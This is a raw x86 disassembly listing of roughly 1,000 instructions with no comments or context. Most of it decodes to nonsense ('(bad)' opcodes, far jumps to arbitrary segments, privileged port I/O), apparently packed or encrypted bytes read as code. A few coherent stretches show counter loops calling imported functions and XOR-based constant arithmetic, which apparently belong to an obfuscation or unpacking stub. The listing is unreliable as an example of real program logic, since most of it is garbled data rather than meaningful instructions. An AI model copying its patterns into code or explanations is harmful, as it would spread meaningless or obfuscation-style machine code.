  4051b0:	push   edx
  4051b1:	pop    ss
  4051b2:	(bad)  
  4051b3:	jmp    0x643f:0x220a817f
  4051ba:	xchg   BYTE PTR [edi+ebp*1+0x14a2c905],bh
  4051c1:	gs xchg edi,eax
  4051c3:	rcl    al,1
  4051c5:	xchg   esi,eax
  4051c6:	mov    edx,DWORD PTR [edi]
  4051c8:	cmp    bh,BYTE PTR [esi-0x5]
  4051cb:	ss (bad) 
  4051cd:	sbb    ch,BYTE PTR [ebx+0x43b2c183]
  4051d3:	adc    eax,0xd26315eb
  4051d8:	xor    eax,ebp
  4051da:	hlt    
  4051db:	push   edx
  4051dc:	mov    ds:0x14d516c3,al
  4051e1:	sbb    ch,BYTE PTR [edi+eax*8+0xc]
  4051e5:	enter  0xbf34,0x63
  4051e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051ea:	mov    WORD PTR [eax-0x682ab7a2],es
  4051f0:	pop    ebp
  4051f1:	test   eax,0x21df7b48
  4051f6:	fld    QWORD PTR [eax]
  4051f8:	xchg   edx,eax
  4051f9:	fsub   QWORD PTR [edi+0x5d]
  4051fc:	sub    al,0x2
  4051fe:	xchg   ecx,eax
  4051ff:	mov    dh,0xb5
  405201:	push   ds
  405202:	add    ah,BYTE PTR [edi-0x40fa7d22]
  405208:	inc    ebx
  405209:	(bad)  [eax-0x50]
  40520c:	ins    DWORD PTR es:[edi],dx
  40520d:	(bad)  
  40520e:	fbstp  TBYTE PTR [ebp-0x19c122c1]
  405214:	sub    BYTE PTR [eax+0x2a],ch
  405217:	push   edi
  405218:	sar    BYTE PTR [eax],cl
  40521a:	jecxz  0x405241
  40521c:	ss cmp dh,ch
  40521f:	retf   
  405220:	daa    
  405221:	jae    0x40522b
  405223:	out    dx,al
  405224:	and    al,0xd1
  405226:	adc    BYTE PTR [edi+edi*1+0xce92ce2],ch
  40522d:	loop   0x4052ab
  40522f:	push   ecx
  405230:	shr    DWORD PTR [ecx],cl
  405232:	nop
  405233:	int    0xf
  405235:	jmp    0x4051d1
  405237:	mov    esp,0x47ecfb37
  40523c:	push   esp
  40523d:	xor    eax,0xe9c5fa4d
  405242:	sbb    DWORD PTR [edx],esi
  405244:	(bad)  
  405245:	adc    eax,0xa377753f
  40524a:	div    bl
  40524c:	jl     0x4052ad
  40524e:	xor    al,0x16
  405250:	dec    eax
  405251:	inc    edx
  405252:	lea    esp,[eax+edi*2-0x7d]
  405256:	jbe    0x4051df
  405258:	sbb    al,0x8f
  40525a:	rcr    esp,0x1
  40525d:	xchg   dl,bl
  40525f:	inc    edi
  405260:	les    ecx,FWORD PTR [edi]
  405262:	std    
  405263:	xor    BYTE PTR [ecx],dl
  405265:	sub    edi,DWORD PTR [esi+eax*4+0x768b89e8]
  40526c:	jmp    0x6a9c:0xcee9b27c
  405273:	xor    al,0x50
  405275:	dec    edi
  405276:	fld    st(1)
  405278:	fmul   st(1),st
  40527a:	mov    bl,0xa
  40527c:	rcr    DWORD PTR [esp+edx*1-0xc03d20a],cl
  405283:	lea    ecx,[ecx+ebp*2]
  405286:	and    esi,DWORD PTR [edi]
  405288:	fimul  DWORD PTR [edi]
  40528b:	aad    0x2f
  40528d:	scas   al,BYTE PTR es:[edi]
  40528e:	dec    ecx
  40528f:	loope  0x405290
  405291:	loop   0x40521a
  405293:	jp     0x405278
  405295:	push   esp
  405296:	enter  0x871e,0x6e
  40529a:	(bad)  
  40529b:	xor    al,0xc0
  40529d:	add    al,BYTE PTR [edx+edx*4+0x44]
  4052a1:	mov    BYTE PTR [ebx+0x23],dh
  4052a4:	data16 xor cl,BYTE PTR [edi]
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	xlat   BYTE PTR ds:[ebx]
  4052a9:	mov    edi,DWORD PTR [ebp-0x18]
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x430626,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x430626
  4052ff:	inc    eax
  405300:	mov    ds:0x430626,eax
  405305:	cmp    DWORD PTR ds:0x430626,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x430626,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42ec28
  40533f:	cmp    DWORD PTR ds:0x430626,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x430626
  405351:	inc    eax
  405352:	mov    ds:0x430626,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x43065a
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x4306ea
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x430642
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x430632,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x430626
  40538a:	add    DWORD PTR ds:0x42e8f2,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x43063e,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x43063e
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x43063e,ecx
  4053ae:	cmp    DWORD PTR ds:0x43063e,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42ed20
  4053c9:	cmp    DWORD PTR ds:0x43063e,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef94,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef94
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef94,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef94,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eb64
  405405:	cmp    DWORD PTR ds:0x42ef94,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef94
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef94,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef94,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x5f546309
  405456:	and    dl,dl
  405458:	and    al,0x7e
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x405442
  405460:	popf   
  405461:	xor    ah,ch
  405463:	sub    al,0x75
  405465:	mov    WORD PTR [ebp+edi*1-0x6326041a],ss
  40546c:	sbb    DWORD PTR [ebx],eax
  40546e:	hlt    
  40546f:	ss clc 
  405471:	mov    ebx,0xef12c731
  405476:	push   ebp
  405477:	cld    
  405478:	lds    edx,FWORD PTR [edi]
  40547a:	xchg   ebp,eax
  40547b:	out    dx,al
  40547c:	arpl   WORD PTR [eax+0x68b2b253],di
  405482:	pop    esi
  405483:	test   BYTE PTR [eax],dh
  405485:	ds xor eax,0xaf32610e
  40548b:	adc    eax,0x8c0756bb
  405490:	int3   
  405491:	dec    edi
  405492:	add    eax,0xee7fb913
  405497:	test   BYTE PTR [edi],bl
  405499:	sbb    bl,BYTE PTR [ecx+0x12]
  40549c:	adc    al,0x7d
  40549e:	ins    DWORD PTR es:[edi],dx
  40549f:	jo     0x4054a3
  4054a1:	inc    esi
  4054a2:	sbb    BYTE PTR [ecx],ah
  4054a4:	enter  0x2d68,0x92
  4054a8:	sub    eax,0x71081bb6
  4054ad:	ins    DWORD PTR es:[edi],dx
  4054ae:	cmp    DWORD PTR [ebp+0x5bdf560b],ebx
  4054b4:	pop    es
  4054b5:	mov    edi,0xba2ff629
  4054ba:	shr    DWORD PTR [eax],0xa9
  4054bd:	sub    BYTE PTR ds:0x5acd6d3d,ah
  4054c3:	cmp    cl,BYTE PTR [eax+0x3ef036ba]
  4054c9:	mov    bl,0xcd
  4054cb:	mov    esp,0x2234a5bf
  4054d0:	pop    edi
  4054d1:	loope  0x40550c
  4054d3:	ret    
  4054d4:	es jo  0x4054fd
  4054d7:	mov    DWORD PTR [edx-0x5b],edi
  4054da:	lods   eax,DWORD PTR ds:[esi]
  4054db:	and    eax,0xd325eac5
  4054e0:	das    
  4054e1:	mov    ecx,0x890b549c
  4054e6:	aaa    
  4054e7:	ds out dx,eax
  4054e9:	xor    BYTE PTR [ecx],cl
  4054eb:	and    BYTE PTR [ebp-0x1e],bh
  4054ee:	enter  0xaf4f,0x42
  4054f2:	rcr    DWORD PTR [ebp+0x6bc974f3],0xd9
  4054f9:	cmp    bh,BYTE PTR [ebp+edx*4+0x6999104f]
  405500:	mov    edi,edi
  405502:	neg    DWORD PTR [edi]
  405504:	iret   
  405505:	lods   eax,DWORD PTR ds:[esi]
  405506:	jmp    0x6aa3:0x581f6710
  40550d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40550e:	lahf   
  40550f:	jmp    0x3ad25701
  405514:	test   eax,0x102727dd
  405519:	dec    ecx
  40551a:	out    0xd,al
  40551c:	xor    bl,BYTE PTR [edi]
  40551e:	xor    al,0xbe
  405520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405521:	cmp    al,0x14
  405523:	imul   ecx,DWORD PTR [ebp-0x3c],0x156cf1b3
  40552a:	dec    esp
  40552b:	push   ecx
  40552c:	adc    eax,0xe989e61a
  405531:	dec    edx
  405532:	cmp    ch,ah
  405534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405535:	cmp    eax,0xe2a8b807
  40553a:	daa    
  40553b:	ins    DWORD PTR es:[edi],dx
  40553c:	mov    ecx,0xb331e384
  405541:	ds push ecx
  405543:	ja     0x405564
  405545:	jno    0x4055a1
  405547:	mov    ch,0x11
  405549:	ins    BYTE PTR es:[edi],dx
  40554a:	dec    eax
  40554b:	loope  0x405560
  40554d:	repz pusha 
  40554f:	sbb    esi,DWORD PTR [ecx+0x3]
  405552:	jmp    0x10a6:0xfc72b2c4
  405559:	inc    edi
  40555a:	mov    bp,0x7b8f
  40555e:	xlat   BYTE PTR ds:[ebx]
  40555f:	xchg   edi,eax
  405560:	retfw  0x9f91
  405564:	jns    0x405568
  405566:	loop   0x405574
  405568:	mov    dl,0x4b
  40556a:	out    0x8,eax
  40556c:	adc    DWORD PTR [edx+0x3698a489],esi
  405572:	mov    cl,0x85
  405574:	clc    
  405575:	dec    ebp
  405576:	clc    
  405577:	push   edi
  405578:	popa   
  405579:	add    ecx,edx
  40557b:	push   ds
  40557c:	sbb    ah,BYTE PTR [edi-0xd]
  40557f:	test   eax,0xdb2a2528
  405584:	stos   BYTE PTR es:[edi],al
  405585:	retf   0xe7a2
  405588:	pop    ecx
  405589:	push   eax
  40558a:	sti    
  40558b:	adc    ah,cl
  40558d:	sar    DWORD PTR [esp+eiz*2-0x4fe03b0e],0x36
  405595:	xchg   DWORD PTR [ebp+0x4e],ebx
  405598:	ja     0x405528
  40559a:	cmp    BYTE PTR [edi],bl
  40559c:	jg     0x40559a
  40559e:	dec    esi
  40559f:	push   esi
  4055a0:	and    ah,BYTE PTR [ebp-0x9]
  4055a3:	xor    al,0x46
  4055a5:	add    edx,DWORD PTR [esi+0x4b]
  4055a8:	jno    0x405598
  4055aa:	pop    ecx
  4055ab:	(bad)  
  4055ac:	shl    ch,1
  4055ae:	les    edi,FWORD PTR [esi-0x1c]
  4055b1:	xor    esi,esp
  4055b3:	push   edx
  4055b4:	ja     0x405569
  4055b6:	and    ah,BYTE PTR [edx]
  4055b8:	xor    DWORD PTR [esi+0x235cb798],eax
  4055be:	mov    bh,0x17
  4055c0:	pop    es
  4055c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055c2:	mov    DWORD PTR [ebx+0x2a],0x5acd40d5
  4055c9:	adc    DWORD PTR [esi+0x60],0xc5df42a7
  4055d0:	bound  edx,QWORD PTR [ebx-0x4f]
  4055d3:	call   0xb82b:0xce1415d1
  4055da:	mov    eax,0xaa593935
  4055df:	ret    
  4055e0:	push   esp
  4055e1:	jmp    0x405626
  4055e3:	push   ebx
  4055e4:	adc    BYTE PTR [ebx],0x9e
  4055e7:	push   esi
  4055e8:	sub    BYTE PTR [ecx+0x4f39de2a],cl
  4055ee:	mov    edx,0x8387a47b
  4055f3:	push   ecx
  4055f4:	and    BYTE PTR [edi],cl
  4055f6:	inc    eax
  4055f7:	jecxz  0x4055c3
  4055f9:	xor    eax,0xb2d16d59
  4055fe:	bswap  ecx
  405600:	cmp    DWORD PTR [ebx-0x79],ecx
  405603:	mov    bl,0xb1
  405605:	xacquire xchg DWORD PTR [bx+di+0x2f0],eax
  40560b:	mov    ah,0xa1
  40560d:	imul   ebp,DWORD PTR [ebx-0x40c62a3],0x79
  405614:	or     eax,0x910dce7f
  405619:	leave  
  40561a:	popa   
  40561b:	push   ds
  40561c:	clc    
  40561d:	cmp    ah,ah
  40561f:	push   es
  405620:	scas   eax,DWORD PTR es:[edi]
  405621:	das    
  405622:	sub    eax,0x848be435
  405627:	mov    al,0x2b
  405629:	or     ah,0x95
  40562c:	mov    fs,WORD PTR [edi+edx*2-0x7fdc2c2e]
  405633:	out    0xe2,eax
  405635:	and    DWORD PTR [eax-0x2],eax
  405638:	gs in  al,0xfc
  40563b:	retf   0x17ca
  40563e:	jge    0x4055e0
  405640:	inc    ecx
  405641:	addr16 mov bl,0x78
  405644:	sbb    ebx,ebp
  405646:	cmp    DWORD PTR [edi+0x69],eax
  405649:	jnp    0x405633
  40564b:	outs   dx,BYTE PTR ds:[esi]
  40564c:	sub    BYTE PTR [ebp+0xaadf480],ch
  405652:	icebp  
  405653:	pop    ss
  405654:	pushf  
  405655:	fs retf 
  405657:	cwde   
  405658:	mov    esi,0x2ddc4af
  40565d:	and    BYTE PTR [ecx+0x3d],dl
  405660:	retf   0x4da9
  405663:	fild   WORD PTR ds:0x8f3b7d18
  405669:	mov    ah,0x58
  40566b:	rcl    BYTE PTR [edi-0x2a],0x5a
  40566f:	nop
  405670:	mov    edx,0xa683c317
  405675:	push   0x15c16bed
  40567a:	out    0x2b,al
  40567c:	mov    ebp,0x97ae8859
  405681:	(bad)  [esi]
  405683:	cmc    
  405684:	je     0x40567b
  405686:	out    0x77,al
  405688:	xor    esi,edi
  40568a:	jp     0x4056ea
  40568c:	push   cs
  40568d:	(bad)  
  40568e:	or     esp,eax
  405690:	fmul   DWORD PTR [eax]
  405692:	mov    ah,ch
  405694:	lahf   
  405695:	mov    edi,0x5873b58c
  40569a:	fcomp  DWORD PTR [edx+ebp*2+0x3a]
  40569e:	sahf   
  40569f:	push   ds
  4056a0:	loopne 0x405659
  4056a2:	mov    cl,0xe7
  4056a4:	dec    ebp
  4056a5:	(bad)
  4056a8:	xchg   edx,eax
  4056a9:	lods   eax,DWORD PTR ds:[esi]
  4056aa:	lea    ebp,[esi+0x13]
  4056ad:	shl    edi,1
  4056af:	mov    DWORD PTR [ebx-0x3f7af9c3],edx
  4056b5:	sub    eax,0x13623c51
  4056ba:	push   edx
  4056bb:	xlat   BYTE PTR ds:[ebx]
  4056bc:	jo     0x40571e
  4056be:	pusha  
  4056bf:	add    al,0x59
  4056c1:	pop    DWORD PTR [esi]
  4056c3:	dec    BYTE PTR [esi]
  4056c5:	fwait
  4056c6:	push   0xd64ef2f4
  4056cb:	sbb    al,BYTE PTR [ebx]
  4056cd:	xor    DWORD PTR [edi-0x34fef1ad],edi
  4056d3:	dec    esi
  4056d4:	gs ret 
  4056d6:	pop    eax
  4056d7:	mov    eax,0xb8c52c1b
  4056dc:	prefetch (bad)
  4056dd:	or     eax,0x56e9bded
  4056e2:	mov    al,ds:0x899acf66
  4056e7:	into   
  4056e8:	push   ebp
  4056e9:	xor    al,0x6a
  4056eb:	iret   
  4056ec:	jnp    0x4056dd
  4056ee:	int    0xe5
  4056f0:	cli    
  4056f1:	out    dx,al
  4056f2:	xchg   esp,eax
  4056f3:	mov    esp,0x1a273e4d
  4056f8:	int    0x6c
  4056fa:	jp     0x4056ce
  4056fc:	shl    esi,0x2d
  4056ff:	xor    esi,DWORD PTR [ecx]
  405701:	jge    0x40576d
  405703:	inc    esi
  405704:	jb     0x40577e
  405706:	lods   eax,DWORD PTR ds:[esi]
  405707:	fsubr  DWORD PTR [ecx+0x4e8327d3]
  40570d:	xchg   edi,eax
  40570e:	fiadd  WORD PTR [edi+0x65]
  405711:	retf   
  405712:	mov    al,0xab
  405714:	jae    0x405790
  405716:	xchg   edi,eax
  405717:	mov    eax,ds:0xe0760fca
  40571c:	pop    eax
  40571d:	sbb    DWORD PTR [ebx-0x2ec81c2c],esp
  405723:	js     0x4056bc
  405725:	mov    DWORD PTR [eax+0x6f],esp
  405728:	add    BYTE PTR ds:0xc70305c3,dh
  40572e:	xor    esi,ebp
  405730:	in     al,0xb3
  405732:	outs   dx,BYTE PTR gs:[esi]
  405734:	mov    al,0x2
  405736:	or     edi,DWORD PTR [ecx+eax*8-0x63bd1628]
  40573d:	jae    0x40577c
  40573f:	add    dl,BYTE PTR [ebx+0x28b6cba9]
  405745:	mov    edi,0x1dd2ad3e
  40574a:	pop    ebx
  40574b:	es in  al,0x89
  40574e:	sbb    al,0xb7
  405750:	sbb    eax,0x6bdded18
  405755:	xor    eax,0x4ff07c45
  40575a:	int    0x29
  40575c:	mov    edx,0xeb86a2cf
  405761:	aad    0x7
  405763:	sub    eax,0x42657dd6
  405768:	popa   
  405769:	fimul  WORD PTR [ecx-0x46]
  40576c:	add    al,0x22
  40576e:	shr    BYTE PTR [edx],0xa6
  405771:	jnp    0x405758
  405773:	(bad)  
  405774:	jge    0x40574c
  405776:	dec    ecx
  405777:	lahf   
  405778:	add    al,dl
  40577a:	push   0x2
  40577c:	nop
  40577d:	out    0x23,al
  40577f:	sbb    al,0x25
  405781:	push   0x72566d98
  405786:	pop    es
  405787:	mov    bl,0x35
  405789:	adc    DWORD PTR [esi],ebp
  40578b:	(bad)  
  40578c:	cmp    eax,0x8fce58b5
  405791:	and    ah,BYTE PTR [edi]
  405793:	push   esp
  405794:	and    edx,edx
  405796:	cmp    BYTE PTR [edi+esi*2-0x1],bl
  40579a:	jmp    0xd7ff:0xcf13626e
  4057a1:	pop    DWORD PTR [ebp+0x10]
  4057a4:	gs jl  0x405785
  4057a7:	lods   eax,DWORD PTR ds:[esi]
  4057a8:	stos   DWORD PTR es:[edi],eax
  4057a9:	sbb    eax,0x4a29e0d5
  4057ae:	mov    edx,0xf5e7423c
  4057b3:	lods   eax,DWORD PTR ds:[esi]
  4057b4:	pusha  
  4057b5:	cmp    eax,0xc33ea531
  4057ba:	popa   
  4057bb:	(bad)  
  4057bc:	mov    dl,BYTE PTR [ecx-0x5c]
  4057bf:	mov    dh,0x26
  4057c1:	or     DWORD PTR [eax],ebp
  4057c3:	xor    BYTE PTR [esp+ebp*4+0x32d7da13],dl
  4057ca:	mov    ebp,0x665eaeae
  4057cf:	imul   DWORD PTR [ebx]
  4057d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d2:	ins    DWORD PTR es:[edi],dx
  4057d3:	push   esp
  4057d4:	aad    0x2d
  4057d6:	mov    ecx,0x9530f705
  4057db:	add    al,0x27
  4057dd:	and    bh,BYTE PTR [ebx+0x45]
  4057e0:	mov    BYTE PTR fs:[ebx-0x15827a82],ch
  4057e7:	inc    esp
  4057e8:	jecxz  0x405847
  4057ea:	mov    cl,al
  4057ec:	and    al,0x64
  4057ee:	pushf  
  4057ef:	enter  0x9db0,0x3f
  4057f3:	inc    ebx
  4057f4:	xchg   esi,eax
  4057f5:	mov    ecx,0xe19ca643
  4057fa:	dec    esp
  4057fb:	ds jbe 0x4057bb
  4057fe:	mov    dl,0x83
  405800:	into   
  405801:	add    cl,bl
  405803:	dec    edx
  405804:	and    DWORD PTR [edi],esp
  405806:	sbb    ecx,DWORD PTR [edx+0x2ae59f19]
  40580c:	jne    0x405842
  40580e:	sbb    DWORD PTR [esi+0x4ab0670],ebp
  405814:	ror    DWORD PTR [esi-0x7dd69333],0xe7
  40581b:	fwait
  40581c:	jno    0x40583d
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x78b481c4],bh
  405847:	inc    ecx
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0x767e7e71
  405851:	xor    al,0xe2
  405853:	inc    esi
  405854:	sub    BYTE PTR [edi],0x27
  405857:	aad    0xd9
  405859:	or     eax,0xbd238031
  40585e:	ins    BYTE PTR es:[edi],dx
  40585f:	dec    esi
  405860:	jmp    0xe7f4859
  405865:	sbb    dl,al
  405867:	xor    DWORD PTR [ebx],esp
  405869:	or     eax,0x4dada701
  40586e:	xchg   edi,eax
  40586f:	out    dx,al
  405870:	sahf   
  405871:	out    0x37,al
  405873:	sti    
  405874:	shl    DWORD PTR [esi],1
  405876:	pop    ebp
  405877:	idiv   ecx
  405879:	push   0x910c2df3
  40587e:	cmp    eax,0xd6f56832
  405883:	inc    esp
  405884:	dec    ebx
  405885:	shl    BYTE PTR [edx-0x4c68c4aa],cl
  40588b:	adc    ah,cl
  40588d:	test   eax,0xdb1ba9cf
  405892:	fwait
  405893:	retf   
  405894:	adc    al,0x6e
  405896:	ficom  DWORD PTR [ecx+0x36111d76]
  40589c:	mov    edi,DWORD PTR [edi+eiz*8]
  40589f:	clc    
  4058a0:	(bad)
  4058a3:	fiadd  WORD PTR [eax]
  4058a5:	mov    ds,WORD PTR ds:0x45c2443d
  4058ab:	loop   0x405836
  4058ad:	adc    ecx,DWORD PTR [ebx]
  4058af:	mov    bl,0xa
  4058b1:	inc    edx
  4058b2:	js     0x405924
  4058b4:	fistp  DWORD PTR [edx-0x725b101d]
  4058ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058bb:	retf   
  4058bc:	cmp    eax,0x5db47a3f
  4058c1:	ds inc ecx
  4058c3:	add    al,0xe3
  4058c5:	mov    ebx,0xddb8aa6b
  4058ca:	inc    esi
  4058cb:	stc    
  4058cc:	cdq    
  4058cd:	pusha  
  4058ce:	cmp    eax,0x81410309
  4058d3:	retf   
  4058d4:	jge    0x40587a
  4058d6:	or     eax,DWORD PTR [ecx+0x4c]
  4058d9:	or     esp,DWORD PTR [esi+0x41894df6]
  4058df:	bound  esi,QWORD PTR [eax+0x32d63200]
  4058e5:	xor    DWORD PTR [eax+0x5b],esp
  4058e8:	mov    ecx,0x67f7efa5
  4058ed:	stc    
  4058ee:	push   edx
  4058ef:	ja     0x40594a
  4058f1:	mov    DWORD PTR [ebp-0x652932dc],esp
  4058f7:	enter  0xf90d,0xf4
  4058fb:	sub    DWORD PTR [eax],esi
  4058fd:	jo     0x405924
  4058ff:	xchg   ebx,eax
  405900:	adc    DWORD PTR [edx-0x6f05043e],ecx
  405906:	mov    esi,0xb0f9c061
  40590b:	std    
  40590c:	loope  0x405958
  40590e:	stc    
  40590f:	(bad)  
  405910:	inc    ebx
  405911:	mov    dl,0x23
  405913:	shl    DWORD PTR [esi-0x44],1
  405916:	xor    al,0x39
  405918:	sub    ch,bh
  40591a:	fldcw  WORD PTR [edx-0x5b]
  40591d:	xor    DWORD PTR [eax],esi
  40591f:	loope  0x4058fe
  405921:	jb     0x40593f
  405923:	mov    DWORD PTR [edi+0x1b7e3ac3],ecx
  405929:	mov    bl,0xde
  40592b:	and    DWORD PTR [ebp-0x3f],ebp
  40592e:	shl    BYTE PTR [edi-0x1a77a101],1
  405934:	imul   BYTE PTR [eax-0x17]
  405937:	xchg   DWORD PTR [ecx-0x68a46c84],esi
  40593d:	retf   0xd296
  405940:	or     esp,DWORD PTR ss:[ebx+0x1a]
  405944:	jae    0x40599e
  405946:	mov    eax,0x4eadec9f
  40594b:	mov    edx,0xce97c827
  405950:	mov    WORD PTR [eax+0x11],?
  405953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405954:	jno    0x4058e0
  405956:	pop    ecx
  405957:	leave  
  405958:	les    esp,FWORD PTR ds:0xf72ef012
  40595e:	pop    edi
  40595f:	je     0x405930
  405961:	mov    edx,0xb1938730
  405966:	xchg   ebp,eax
  405967:	or     ch,dh
  405969:	push   ds
  40596a:	lock in eax,0x71
  40596d:	jg     0x405914
  40596f:	fldcw  WORD PTR [ebp+0x2d8ae6bd]
  405975:	std    
  405976:	cmp    edx,DWORD PTR [eax]
  405978:	add    al,0xfd
  40597a:	mov    al,ds:0xbea2dfdd
  40597f:	leave  
  405980:	mov    ch,0x40
  405982:	stos   BYTE PTR es:[edi],al
  405983:	lahf   
  405984:	cmp    al,0x75
  405986:	inc    edx
  405987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405988:	lods   al,BYTE PTR ds:[esi]
  405989:	mov    dh,0x81
  40598b:	hlt    
  40598c:	adc    eax,0x89aa6676
  405991:	int3   
  405992:	in     al,0x5c
  405994:	cmp    eax,0xe29ed45a
  405999:	outs   dx,BYTE PTR ds:[esi]
  40599a:	cs push es
  40599c:	push   edi
  40599d:	push   ebx
  40599e:	mov    ebp,0xb373c63a
  4059a3:	ja     0x40595f
  4059a5:	scas   eax,DWORD PTR es:[edi]
  4059a6:	stos   BYTE PTR es:[edi],al
  4059a7:	inc    edi
  4059a8:	or     eax,0x174726e0
  4059ad:	jno    0x40599a
  4059af:	jno    0x4059ae
  4059b1:	fisubr DWORD PTR [eax+0x48]
  4059b4:	cld    
  4059b5:	jmp    0xb5c9fccd
  4059ba:	push   edx
  4059bb:	stos   DWORD PTR es:[edi],eax
  4059bc:	push   ecx
  4059bd:	out    0xb2,al
  4059bf:	nop
  4059c0:	dec    ecx
  4059c1:	stos   BYTE PTR es:[edi],al
  4059c2:	mov    ecx,0xadd08bcb
  4059c7:	inc    edi
  4059c8:	pop    eax
  4059c9:	into   
  4059ca:	mov    edx,0x69421a8e
  4059cf:	mov    ds:0xffc96d01,al
  4059d4:	mov    edx,0x3b08a26e
  4059d9:	inc    eax
  4059da:	retf   
  4059db:	sar    DWORD PTR [edx+0x3dd75db1],1
  4059e1:	aam    0xa9
  4059e3:	mov    eax,0x58c5359b
  4059e8:	sub    bh,bl
  4059ea:	(bad)  
  4059eb:	in     al,dx
  4059ec:	(bad)  
  4059ed:	pop    esi
  4059ee:	(bad)  
  4059ef:	in     eax,dx
  4059f0:	fwait
  4059f1:	adc    eax,0x8995d221
  4059f6:	cmp    al,0x71
  4059f8:	sbb    eax,DWORD PTR ds:0x9ae0cd42
  4059fe:	jmp    0x93b21424
  405a03:	(bad)  
  405a04:	xor    al,0x21
  405a06:	ret    0x8cc4
  405a09:	sbb    DWORD PTR [ebx-0x707f69ac],0x1cf1ef01
  405a13:	pop    esi
  405a14:	pop    es
  405a15:	out    0x30,eax
  405a17:	ret    0xcfb1
  405a1a:	jb     0x405a3f
  405a1c:	(bad)  
  405a1d:	jmp    0xc9726191
  405a22:	xchg   edi,eax
  405a23:	add    al,0xf3
  405a25:	mov    ebp,0x89782b91
  405a2a:	loop   0x405a5a
  405a2c:	loopne 0x405a0d
  405a2e:	fistp  DWORD PTR [ebx]
  405a30:	bswap  ebx
  405a32:	adc    BYTE PTR [ecx+0x18c410bd],dl
  405a38:	push   0xb9aad58e
  405a3d:	push   0xb249b452
  405a42:	out    0x7,eax
  405a44:	int    0x7d
  405a46:	bound  eax,QWORD PTR [ecx]
  405a48:	adc    al,0x5
  405a4a:	daa    
  405a4b:	cmc    
  405a4c:	cmp    DWORD PTR [ecx-0x558352c8],0x1a
  405a53:	cmp    DWORD PTR [edi-0x51],esi
  405a56:	pop    esp
  405a57:	sti    
  405a58:	out    dx,al
